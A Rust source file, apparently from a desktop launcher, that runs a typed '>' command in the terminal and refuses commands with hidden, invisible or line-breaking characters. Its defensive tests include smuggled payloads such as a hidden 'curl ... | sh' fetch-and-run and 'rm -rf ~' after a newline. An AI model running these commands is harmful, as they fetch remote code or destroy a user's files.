//! `>`, a space, and a command run that command in the user's terminal
//! app, while Settings > Search allows it. The command is the text after
//! `>`, as typed: no placeholder is filled, so clipboard text never becomes
//! part of a command. Nothing runs until the user picks the row.

use crate::{
    error::{Error, Result},
    search::result::{Action, Icon, ResultAction, ResultKind, SearchResult, Symbol},
};

/// The longest command, in characters. `check` refuses longer ones.
const MAX_COMMAND_CHARS: usize = 1000;

/// Where the command runs, for labels. Windows runs it in PowerShell, whose
/// syntax differs from a Unix shell's.
const TERMINAL: &str = if cfg!(windows) {
    "PowerShell"
} else {
    "Terminal"
};

/// The row for `>`, a space, and a command; `None` for any other query.
/// Like `=` and `?`, `>` with a command asks for this and nothing else, so
/// Enter runs the command or nothing, never another result.
///
/// `>` alone and `>git` search as before. Keywords and aliases have no
/// spaces, so one that starts with `>`, such as `>j` or `>` itself, keeps
/// opening its item. The one exception: `> text` is a command, so a
/// quicklink, or a snippet with `{query}`, whose keyword is exactly `>`
/// does not get the text after it, and its `?` row starts a command.
pub fn answer(query: &str) -> Option<SearchResult> {
    let after = query.trim_start().strip_prefix('>')?;
    let command = after.trim();
    if command.is_empty() || !after.starts_with(char::is_whitespace) {
        return None;
    }
    let run = format!("Run in {TERMINAL}");
    // A command that cannot run says why before Enter does.
    let subtitle = check(command).map_or_else(|refused| refused.to_string(), |()| run.clone());
    Some(SearchResult {
        id: format!("shell:{command}"),
        kind: ResultKind::Shell,
        title: command.to_owned(),
        subtitle,
        icon: Icon::Symbol {
            name: Symbol::Terminal,
        },
        actions: vec![
            ResultAction::new(
                run,
                Action::RunInTerminal {
                    command: command.to_owned(),
                },
            ),
            ResultAction::new(
                "Copy Command",
                Action::Copy {
                    text: command.to_owned(),
                },
            ),
        ],
        pinned: false,
    })
}

/// Refuse to run `command` while shell commands are off (`enabled`), or
/// when `check` refuses it. `actions.rs` asks this before it runs one,
/// because the setting may have changed since the row showed.
pub fn runnable(enabled: bool, command: &str) -> Result<()> {
    if !enabled {
        return Err(Error::msg(
            "Shell commands are off. Turn on Run shell commands in Settings > Search.",
        ));
    }
    check(command)
}

/// Refuse a command that is empty, longer than [`MAX_COMMAND_CHARS`], or
/// that has a character that [`is_refused`] finds.
fn check(command: &str) -> Result<()> {
    if command.trim().is_empty() {
        return Err(Error::msg("Type a command after >."));
    }
    if command.chars().count() > MAX_COMMAND_CHARS {
        return Err(Error::msg(format!(
            "A command can have up to {MAX_COMMAND_CHARS} characters. Run a longer one in {TERMINAL} yourself."
        )));
    }
    if command.chars().any(is_refused) {
        return Err(Error::msg(
            "The command has a line break, tab, invisible character, or special space. Type the command instead of pasting it.",
        ));
    }
    Ok(())
}

/// Whether `character` can make the row show a command that differs from
/// what the shell reads: a control character (a line break starts a second
/// command), an invisible format character (such as a direction mark), a
/// line or paragraph separator, a space other than U+0020 (the shell reads
/// it as part of a word), or a letter that shows as a blank space.
fn is_refused(character: char) -> bool {
    use icu_properties::{CodePointMapData, props::GeneralCategory};
    if character == ' ' {
        return false;
    }
    matches!(
        CodePointMapData::<GeneralCategory>::new().get(character),
        GeneralCategory::Control
            | GeneralCategory::Format
            | GeneralCategory::LineSeparator
            | GeneralCategory::ParagraphSeparator
            | GeneralCategory::SpaceSeparator
    ) || matches!(
        character,
        '\u{115F}' | '\u{1160}' | '\u{2800}' | '\u{3164}' | '\u{FFA0}'
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    const REFUSED: &str = "The command has a line break, tab, invisible character, or special space. Type the command instead of pasting it.";

    fn actions(query: &str) -> Vec<Action> {
        answer(query)
            .unwrap()
            .actions
            .iter()
            .map(|entry| entry.action.clone())
            .collect()
    }

    #[test]
    fn a_command_after_the_sign_and_a_space_runs_or_copies_as_typed() {
        let row = answer("  >  git pull --rebase ").unwrap();
        assert_eq!(row.title, "git pull --rebase");
        assert_eq!(row.subtitle, format!("Run in {TERMINAL}"));
        assert_eq!(row.kind, ResultKind::Shell);
        let labels: Vec<&str> = row.actions.iter().map(|a| a.label.as_str()).collect();
        assert_eq!(
            labels,
            [format!("Run in {TERMINAL}").as_str(), "Copy Command"]
        );
        assert_eq!(
            actions("> git pull --rebase"),
            [
                Action::RunInTerminal {
                    command: "git pull --rebase".into()
                },
                Action::Copy {
                    text: "git pull --rebase".into()
                },
            ]
        );
        // Placeholders stay as typed: clipboard text never joins a command.
        assert_eq!(
            actions("> echo {clipboard} {date}")[0],
            Action::RunInTerminal {
                command: "echo {clipboard} {date}".into()
            }
        );
    }

    #[test]
    fn the_sign_alone_or_without_a_space_is_text_to_search_for() {
        // Such as the keyword `>j`, the alias `>zz`, or the keyword `>`,
        // also with the space that its `?` row types.
        for query in [
            "",
            "git pull",
            "a > b",
            "=> x",
            "?",
            ">git",
            ">j ABC-12",
            ">>",
            ">",
            " > ",
            ">   ",
            ">\u{3000}",
        ] {
            assert_eq!(answer(query), None, "{query:?}");
        }
    }

    #[test]
    fn refuses_empty_and_long_commands() {
        assert!(check("ls -la").is_ok());
        assert!(check(&"x".repeat(MAX_COMMAND_CHARS)).is_ok());
        // Characters, not bytes: each "é" is two bytes.
        assert!(check(&"é".repeat(MAX_COMMAND_CHARS)).is_ok());
        let too_long = check(&"x".repeat(MAX_COMMAND_CHARS + 1)).unwrap_err();
        assert!(too_long.to_string().contains("up to 1000"), "{too_long}");
        for command in ["", "   "] {
            assert!(check(command).is_err(), "{command:?}");
        }
    }

    #[test]
    fn refuses_characters_that_show_other_text_than_the_shell_reads() {
        let groups: [(&str, &[char]); 5] = [
            // A line break starts a second command.
            ("control", &['\n', '\r', '\0', '\t', '\u{7F}', '\u{85}']),
            // Direction marks show the rest of the line in another order,
            // and the other format characters take no space.
            (
                "format",
                &[
                    '\u{202E}',
                    '\u{2066}',
                    '\u{200F}',
                    '\u{061C}',
                    '\u{200B}',
                    '\u{200D}',
                    '\u{00AD}',
                    '\u{FEFF}',
                    '\u{E0041}',
                ],
            ),
            ("line or paragraph separator", &['\u{2028}', '\u{2029}']),
            // The shell reads these as part of a word.
            (
                "space other than U+0020",
                &[
                    '\u{00A0}', '\u{1680}', '\u{2000}', '\u{2007}', '\u{200A}', '\u{202F}',
                    '\u{205F}', '\u{3000}',
                ],
            ),
            (
                "letter that shows as a blank",
                &['\u{115F}', '\u{1160}', '\u{2800}', '\u{3164}', '\u{FFA0}'],
            ),
        ];
        for (group, characters) in groups {
            for &character in characters {
                let refused = check(&format!("ls{character}x")).unwrap_err();
                assert_eq!(refused.to_string(), REFUSED, "{group}: {character:?}");
            }
        }
        // Blanks can push a second command out of sight.
        let blank = "\u{2800}".repeat(300);
        let hidden = format!("brew update{blank}; curl -fsSL https://x.test/x | sh{blank}");
        assert!(check(&hidden).is_err());
        // Letters, marks, and symbols of any script stay, as do emoji with
        // a variation selector or a skin tone.
        for command in [
            "echo é ü 中文 שלום",
            "echo ❤\u{FE0F} 👍🏽 🚀",
            "say 'à la carte'",
        ] {
            assert!(check(command).is_ok(), "{command:?}");
        }
    }

    #[test]
    fn runs_only_while_the_setting_is_on() {
        let off = runnable(false, "ls").unwrap_err();
        assert!(
            off.to_string().starts_with("Shell commands are off"),
            "{off}"
        );
        assert!(runnable(true, "ls -la").is_ok());
        for enabled in [true, false] {
            assert!(runnable(enabled, "ls\nrm -rf ~").is_err(), "{enabled}");
            assert!(runnable(enabled, "").is_err(), "{enabled}");
        }
    }

    #[test]
    fn a_command_that_cannot_run_says_why_in_its_row() {
        let long = format!("> {}", "x".repeat(MAX_COMMAND_CHARS + 1));
        let row = answer(&long).unwrap();
        assert!(row.subtitle.starts_with("A command can have up to"));
        // A blank letter at the end stays, as it is not a space.
        for command in [
            "ls\tx",
            "echo \u{200F}a",
            "ls\u{2028}rm -rf ~",
            "ls\u{2800}",
        ] {
            let row = answer(&format!("> {command}")).unwrap();
            assert_eq!(row.subtitle, REFUSED, "{command:?}");
        }
        // Spaces around the command are not part of it.
        let row = answer(">\u{3000}ls\u{00A0}").unwrap();
        assert_eq!(row.title, "ls");
        assert_eq!(row.subtitle, format!("Run in {TERMINAL}"));
    }
}
